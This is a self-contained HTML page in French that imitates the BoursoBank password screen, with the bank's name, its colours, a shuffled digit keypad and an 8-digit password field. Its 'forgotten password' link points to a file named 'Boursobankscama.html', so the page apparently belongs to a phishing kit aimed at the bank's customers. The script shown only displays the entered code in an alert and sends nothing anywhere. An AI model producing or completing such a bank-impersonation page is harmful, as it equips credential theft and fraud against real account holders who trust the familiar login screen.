<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BoursoBank - Saisir votre mot de passe</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            background: linear-gradient(135deg, #e8eef7 0%, #f0f4fb 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .header {
            margin-bottom: 40px;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 0;
        }

        .logo img {
            height: 60px;
            width: auto;
            max-width: 250px;
        }

        .card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            max-width: 550px;
            width: 100%;
            overflow: hidden;
        }

        .card-header {
            background: linear-gradient(90deg, #e60466 0%, #e60466 100%);
            height: 8px;
        }

        .card-content {
            padding: 50px 40px;
            text-align: center;
        }

        h1 {
            color: #003d82;
            font-size: 24px;
            margin-bottom: 15px;
            font-weight: 600;
        }

        .subtitle {
            color: #5a7a96;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .password-display {
            background: #f5f7fb;
            border: 2px solid #e0e6f0;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 30px;
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            flex-wrap: wrap;
        }

        .password-dot {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background-color: #003d82;
            transition: all 0.3s ease;
        }

        .password-empty-dot {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background-color: #e0e6f0;
            transition: all 0.3s ease;
        }

        .keyboard {
            margin-bottom: 25px;
        }

        .keyboard-row {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-bottom: 10px;
        }

        .keyboard-row.row-zero {
            grid-template-columns: 1fr;
        }

        .key {
            background: white;
            border: 2px solid #e0e6f0;
            border-radius: 8px;
            padding: 16px 12px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.2s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px;
            user-select: none;
        }

        .key:hover {
            background: #f5f7fb;
            border-color: #e60466;
            transform: translateY(-2px);
        }

        .key:active {
            background: #e60466;
            color: white;
            border-color: #e60466;
            transform: translateY(0);
        }

        .key-number {
            font-size: 20px;
            color: #003d82;
            font-weight: bold;
        }

        .key-letters {
            font-size: 11px;
            color: #5a7a96;
            letter-spacing: 1px;
        }

        .key:active .key-number,
        .key:active .key-letters {
            color: white;
        }

        .action-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .btn-delete {
            flex: 1;
            background: white;
            border: 2px solid #e0e6f0;
            border-radius: 8px;
            padding: 14px;
            cursor: pointer;
            font-weight: 600;
            color: #5a7a96;
            transition: all 0.2s ease;
            font-size: 16px;
        }

        .btn-delete:hover {
            background: #f5f7fb;
            border-color: #e60466;
            color: #e60466;
        }

        .btn-delete:active {
            background: #e0e6f0;
        }

        .btn-confirm {
            flex: 1;
            background: linear-gradient(135deg, #e60466 0%, #d60461 100%);
            border: none;
            border-radius: 8px;
            padding: 14px;
            cursor: pointer;
            font-weight: 600;
            color: white;
            transition: all 0.2s ease;
            font-size: 16px;
        }

        .btn-confirm:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(230, 4, 102, 0.3);
        }

        .btn-confirm:active {
            transform: translateY(0);
        }

        .btn-confirm:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .character-counter {
            color: #5a7a96;
            font-size: 12px;
            margin-top: 10px;
        }

        .help-link {
            display: block;
            text-align: center;
            color: #0066cc;
            text-decoration: none;
            font-size: 13px;
            margin-top: 25px;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: 40px;
            text-align: center;
            color: #5a7a96;
            font-size: 12px;
        }

        .footer a {
            color: #003d82;
            text-decoration: none;
            margin: 0 8px;
        }

        @media (max-width: 600px) {
            .card-content {
                padding: 40px 20px;
            }

            .key {
                padding: 12px 8px;
            }

            .key-number {
                font-size: 18px;
            }

            .key-letters {
                font-size: 10px;
            }

            .password-dot,
            .password-empty-dot {
                width: 16px;
                height: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <img src="logo bousobank.png" alt="BoursoBank">
        </div>
    </div>

    <div class="card">
        <div class="card-header"></div>
        
        <div class="card-content">
            <h1>Saisir votre mot de passe</h1>
            <p class="subtitle">Veuillez saisir votre mot de passe à l'aide du clavier ci-dessous</p>

            <div class="password-display" id="passwordDisplay">
                <div class="password-empty-dot"></div>
                <div class="password-empty-dot"></div>
                <div class="password-empty-dot"></div>
                <div class="password-empty-dot"></div>
                <div class="password-empty-dot"></div>
                <div class="password-empty-dot"></div>
                <div class="password-empty-dot"></div>
                <div class="password-empty-dot"></div>
            </div>
            <div class="character-counter"><span id="charCount">0</span>/8 caractères</div>

            <div class="keyboard" id="keyboard"></div>

            <div class="action-buttons">
                <button class="btn-delete" onclick="deletePassword()">Effacer</button>
                <button class="btn-confirm" id="confirmBtn" onclick="confirmPassword()" disabled>Valider</button>
            </div>

            <a href="Boursobankscama.html" class="help-link">Mot de passe oublié ?</a>
        </div>
    </div>

    <div class="footer">
        <a href="#">Aide</a> / 
        <a href="#">Opposition</a> / 
        <a href="#">Sécurité</a>
    </div>

    <script>
        let passwordValue = '';
        const charCount = document.getElementById('charCount');
        const confirmBtn = document.getElementById('confirmBtn');
        const keyboardContainer = document.getElementById('keyboard');
        const passwordDisplay = document.getElementById('passwordDisplay');
        const MAX_LENGTH = 8;

        // Lettres associées à chaque chiffre (comme un clavier téléphonique)
        const keyMap = {
            '1': '',
            '2': 'ABC',
            '3': 'DEF',
            '4': 'GHI',
            '5': 'JKL',
            '6': 'MNO',
            '7': 'PQRS',
            '8': 'TUV',
            '9': 'WXYZ',
            '0': ''
        };

        // Générer un clavier aléatoire
        function generateRandomKeyboard() {
            let digits = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'];
            
            // Mélanger les chiffres
            for (let i = digits.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [digits[i], digits[j]] = [digits[j], digits[i]];
            }

            // Créer les rangées
            keyboardContainer.innerHTML = '';
            
            // Rangées de 3
            for (let i = 0; i < 9; i += 3) {
                const row = document.createElement('div');
                row.className = 'keyboard-row';
                
                for (let j = 0; j < 3; j++) {
                    const keyDiv = document.createElement('div');
                    keyDiv.className = 'key';
                    const digit = digits[i + j];
                    
                    keyDiv.innerHTML = `
                        <span class="key-number">${digit}</span>
                        ${keyMap[digit] ? `<span class="key-letters">${keyMap[digit]}</span>` : ''}
                    `;
                    
                    keyDiv.onclick = () => addPassword(digit);
                    row.appendChild(keyDiv);
                }
                
                keyboardContainer.appendChild(row);
            }

            // Rangée pour le 0
            const rowZero = document.createElement('div');
            rowZero.className = 'keyboard-row row-zero';
            const keyZero = document.createElement('div');
            keyZero.className = 'key';
            keyZero.innerHTML = `<span class="key-number">0</span>`;
            keyZero.onclick = () => addPassword('0');
            rowZero.appendChild(keyZero);
            keyboardContainer.appendChild(rowZero);
        }

        function addPassword(digit) {
            if (passwordValue.length < MAX_LENGTH) {
                passwordValue += digit;
                updateDisplay();
            }
        }

        function deletePassword() {
            passwordValue = passwordValue.slice(0, -1);
            updateDisplay();
        }

        function updateDisplay() {
            const displayLength = passwordValue.length;
            
            // Recréer les points
            passwordDisplay.innerHTML = '';
            
            // Points bleus pour les chiffres saisis
            for (let i = 0; i < displayLength; i++) {
                const dot = document.createElement('div');
                dot.className = 'password-dot';
                passwordDisplay.appendChild(dot);
            }
            
            // Points gris pour les chiffres restants
            for (let i = displayLength; i < MAX_LENGTH; i++) {
                const dot = document.createElement('div');
                dot.className = 'password-empty-dot';
                passwordDisplay.appendChild(dot);
            }
            
            charCount.textContent = displayLength;
            
            // Activer le bouton seulement si 8 caractères saisis
            confirmBtn.disabled = displayLength !== MAX_LENGTH;
        }

        function confirmPassword() {
            if (passwordValue.length !== MAX_LENGTH) {
                alert('Veuillez saisir 8 chiffres');
                return;
            }
            alert('✓ Connexion en cours...\nMot de passe: ' + passwordValue);
            passwordValue = '';
            updateDisplay();
            generateRandomKeyboard();
        }

        // Initialiser le clavier au chargement
        generateRandomKeyboard();
        updateDisplay();
    </script>
</body>
</html>
